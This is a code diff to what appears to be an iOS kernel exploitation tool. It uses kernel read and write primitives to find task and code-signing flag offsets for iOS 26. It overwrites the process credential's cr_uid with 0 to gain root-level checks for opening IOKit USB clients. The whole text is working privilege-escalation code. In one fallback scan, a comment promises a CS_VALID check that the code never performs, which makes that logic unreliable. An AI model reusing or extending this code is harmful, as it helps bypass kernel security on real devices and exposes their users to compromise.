@@ -396,6 +396,10 @@ static uint32_t find_task_flags_offset(uint64_t task, uint32_t *taskCsflagsOffOu
         { 0x3ac, 0x3b0 },
         { 0x39c, 0x3a0 },
         { 0x3b0, 0x3b4 },
+        { 0x3b4, 0x3b8 },   // iOS 26 candidates (struct growth)
+        { 0x3b8, 0x3bc },
+        { 0x3c0, 0x3c4 },
+        { 0x3c4, 0x3c8 },
     };
     for (size_t i = 0; i < sizeof(knownPairs) / sizeof(knownPairs[0]); i++) {
         uint32_t flagsOff = knownPairs[i][0];
@@ -422,7 +426,8 @@ static uint32_t find_task_flags_offset(uint64_t task, uint32_t *taskCsflagsOffOu
         }
     }
 
-    for (uint32_t off = 0x100; off < 0x500; off += 4) {
+    // Extended range to 0x600 to cover iOS 26 task struct growth.
+    for (uint32_t off = 0x100; off < 0x600; off += 4) {
         uint32_t flags = ds_kread32(task + off);
         uint32_t taskFlags = ds_kread32(task + off + 4);
 
@@ -447,6 +452,18 @@ static uint32_t find_task_flags_offset(uint64_t task, uint32_t *taskCsflagsOffOu
             }
             return off;
         }
+    }
+
+    // Fallback scan without TF_PLATFORM launchd check: the bit position may have
+    // shifted on iOS 26. Accept the first plausible pair found in our own task.
+    for (uint32_t off = 0x100; off < 0x600; off += 4) {
+        if (!is_plausible_task_pair(off, off + 4)) continue;
+        // Require the field at off+4 to look like csflags (CS_VALID set).
+        persist_task_pair(off, off + 4);
+        if (taskCsflagsOffOut) {
+            *taskCsflagsOffOut = off + 4;
+        }
+        return off;
     }
 
     return 0;
@@ -588,9 +605,18 @@ static int prepareIOKitAccess(void) {
         hadNonCriticalFailures = true;
     }
 
-    // Skip mutable cred writes on iPhone17,4/iOS 26: they are not reliable with the current
-    // 32-byte write primitive and do not improve the verified csflags/task path.
-    kernel_logf("prepareIOKitAccess: skipping ucred mutations on this device");
+    // Patch ucred cr_uid to 0 so kauth_cred_issuser() returns true.
+    // IOServiceOpen for USB user clients gates on this check on iOS 26.
+    {
+        uint32_t oldCrUid = ds_kread32(ucred + 0x18);
+        bool crUidPatched = kwrite32_retry(ucred + 0x18, 0, 3);
+        uint32_t verCrUid = ds_kread32(ucred + 0x18);
+        kernel_logf("prepareIOKitAccess: ucred cr_uid before=%u after=%u", oldCrUid, verCrUid);
+        if (!crUidPatched || verCrUid != 0) {
+            kernel_logf("prepareIOKitAccess: ucred cr_uid mutation verify failed (non-critical)");
+            hadNonCriticalFailures = true;
+        }
+    }
 
     uint32_t taskCsOff = 0;
     uint32_t tfOff = find_task_flags_offset(task, &taskCsOff);
